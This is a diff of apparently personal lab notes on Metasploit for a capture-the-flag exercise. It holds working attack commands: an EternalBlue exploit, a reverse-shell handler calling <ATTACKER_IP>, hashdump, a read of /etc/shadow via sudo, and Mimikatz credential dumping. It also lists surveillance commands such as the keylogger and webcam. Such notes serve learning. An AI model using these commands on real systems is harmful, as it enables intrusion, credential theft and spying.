@@ -155,32 +155,32 @@ Some payloads may need to set new parameters, running `show options` will list t
 After executing a payload to the target, we can abort it (ctrl C) or background it (ctrl Z).
 
 ```bash
-$ sessions
+sessions
 ```
 The above command will list all active sessions. we can use `sessions -h` which can help us manage sessions. We can use `sessions -i <Id>` to interact with any existing session.
 
 So now we will exploit port 445 or port 139, where MS17-010 affects both.
 
 ```bash
-$ search MS17-010
-$ use exploit/windows/smb/ms17_010_eternalblue
-$ show options
-$ set RHOSTS <target_IP>
-$ set LHOST <Your IP>
-$ run
+search MS17-010
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set RHOSTS <target_IP>
+set LHOST <Your IP>
+run
 ```
 After gaining cmd shell, run:
 ```bash
-$ cd C:\\
-$ cd Users
-$ cd Jon
-$ dir flag.txt /s
+cd C:\\
+cd Users
+cd Jon
+dir flag.txt /s
 ```
 After that we use another payload for using meterpreter
 ```bash
-$ use payload 30
-$ cd /
-$ hashdump
+use payload 30
+cd /
+hashdump
 ```
 
 ### MSFvenom
@@ -262,10 +262,10 @@ Prepare and launch the attack
 ```bash
 msfconsole -q
 msf6> use exploit/multi/handler
-msf6 exploit(multi/handler)> set payload linux/x86/meterpreter/reverse_tcp
-msf6 exploit(multi/handler)> set lhost <ATTACKER_IP>
-msf6 exploit(multi/handler)> set lport 7777
-msf6 exploit(multi/handler)> run
+msf6> exploit(multi/handler)> set payload linux/x86/meterpreter/reverse_tcp
+msf6> exploit(multi/handler)> set lhost <ATTACKER_IP>
+msf6> exploit(multi/handler)> set lport 7777
+msf6> exploit(multi/handler)> run
 ```
 
 Execute on Target Machine
@@ -291,3 +291,159 @@ echo "1q2w3e4r" | sudo -S -l
 echo "1q2w3e4r" | sudo -S cat /etc/shadow    # -S causes sudo to read the password from standard input instead of the terminal device
 ``` 
 
+If `sudo -l -l` say /bin/bash, then we can run `sudo /bin/bash` as root.
+
+## Meterpreter
+Meterpreter is a remote agent that runs inside a process on the target machine.
+
+When executed the meterpreter payload, it loads into RAM. Doesn't create a file like meterpreter.exe on the target's hard drive. The feature aims to avoid being detected during antivirus scans. Most antivirus software scans new files on disk. It also doesn't run as its own process, instead it injects itself into an existing, legitimate process. All the traffic between attacking machine and target is encrypted via TLS. IDS/IPS systems can't see what's happening inside the encrypted tunnel.
+
+### Meterpreter commands:
+Core commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used. Remember to check all available commands running the help command once a Meterpreter session has started.
+
+**Core commands**
+- background: Backgrounds the current session
+- exit: Terminate the Meterpreter session
+- guid: Get the session GUID (Globally Unique Identifier)
+- help: Displays the help menu
+- info: Displays information about a Post module
+- irb: Opens an interactive Ruby shell on the current session
+- load: Loads one or more Meterpreter extensions
+- migrate: Allows you to migrate Meterpreter to another process
+- run: Executes a Meterpreter script or Post module
+- sessions: Quickly switch to another session
+
+**File system commands**
+- cd: Will change directory
+- ls: Will list files in the current directory (dir will also work)
+- pwd: Prints the current working directory
+- edit: will allow you to edit a file
+- cat: Will show the contents of a file to the screen
+- rm: Will delete the specified file
+- search: Will search for files
+- upload: Will upload a file or directory
+- download: Will download a file or directory
+
+**Networking commands**
+- arp: Displays the host arp(Address Resolution Protocol) cache
+- ifconfig: Displays network interfaces available on the target system
+- netstat: Displays the network connections
+- portfwd: Forwards a local port to a remote service
+- route: Allows you to view and modify the routing table
+
+**System commands**
+-clearev: Clears the event logs
+-execute: Executes a command
+-getpid: Shows the current process identifier
+-getuid: Shows the user that Meterpreter is running as
+-kill: Terminates a process
+-pkill: Terminates processes by name
+-ps: Lists running processes
+-reboot: Reboots the remote computer
+-shell: Drops into a system command shell
+-shutdown: Shuts down the remote computer
+-sysinfo: Gets information about the remote system, such as OS
+
+**Others Commands (these will be listed under different menu categories in the help menu)**
+- idletime: Returns the number of seconds the remote user has been idle
+- keyscan_dump: Dumps the keystroke buffer
+- keyscan_start: Starts capturing keystrokes
+- keyscan_stop: Stops capturing keystrokes
+- screenshare: Allows you to watch the remote user's desktop in real time
+- screenshot: Grabs a screenshot of the interactive desktop
+- record_mic: Records audio from the default microphone for X seconds
+- webcam_chat: Starts a video chat
+- webcam_list: Lists webcams
+- webcam_snap: Takes a snapshot from the specified webcam
+- webcam_stream: Plays a video stream from the specified webcam
+- getsystem: Attempts to elevate your privilege to that of local system
+- hashdump: Dumps the contents of the SAM database
+
+**Example:**
+- getuid -> NT AUTHORITY\SYSTEM -> highest priviledge
+- migrate 716 moves meterpreter from PID <OLDER_PID> to PID 716. Some process have better capabilitites.
+
+Meterpreter is inside a process. The process has a security context (the user/privileges it runs as). If Meterpreter migrates into a low-privilege process, it inherits that process's security context. Once it's moved, it can't just climb back up, it's now trapped in that low-privilege container.
+
+### Post exploitation modules
+**load command:**
+- loads additional extensions/mdoules into your current meterpreter session.
+- ex:- load python, load kiwi
+- once loaded, new commands appear in help menu
+
+**load python:**
+- lets you execute python code directly from meterpreter.
+```bash
+python_execute "print 'Hello Friend!'"
+```
+
+**load kiwi (Mimikatz):**
+- loads mimikatz, a famous windows credential extraction tool
+commands:
+```bash
+creds_all      # extract all stored credentials
+creds_msv      # grab NTLM hashes
+lsa_dump_sam   # dump SAM database
+golden_ticket_create    # create forged kerberos tickets
+wifi_list      # steal wifi credentials
+```
+
+**Questions**
+```bash
+sudo nmap -sC -sV -O <Target_IP>  # This will reveal open ports, OS and computer name
+msfconsole
+use exploit/windows/smb/psexec
+set RHOSTS <TARGET_IP>
+set LHOST <YOUR_IP>
+set SMBUser ballen
+set SMBPass Password1
+run
+```
+
+```bash
+meterpreter > sysinfo   # instead of nmap, reveals computer name and domain
+meterpreter > CTRL Z
+```
+
+For share names enumeration
+```bash
+use post/windows/gather/enum_shares
+set session <Your session number according to the meterpreter session>
+sessions -i 1
+run
+```
+
+**Decision logic:** 
+Now we have to migrate to a x64 process, because current meterpreter running in x86 while the architecture is x64. So we have to move to stable, NT AUTHORITY\SYSTEM and x64 process. We will choose svchost.exe as it is safer because it is one of many instances, and even if it crashes others will keep the system running.
+
+```bash
+meterpreter > ps
+meterpreter > migrate 340
+meterpreter > hashdump
+```
+**NTLM hash format:** username:RID:LM_hash:NTLM_hash:::
+
+```bash
+meterpreter > load kiwi
+meterpreter > creds_all
+```
+
+**Decision logic:**
+Since jchambers isn't logged in, it won't show his credentials. So we will use crackstation.net for the NTLM hash.
+
+```bash
+meterpreter > search -f secrets.txt
+meterpreter > shell
+```
+Go to the directory mentioned in search -f command
+```
+cd <FULL_DIRECTORY_PATH>
+dir
+type secrets.txt
+```
+
+Now for the realsecret.txt
+```bash
+meterpreter > search -f realsecret.txt
+```
+And same as above.
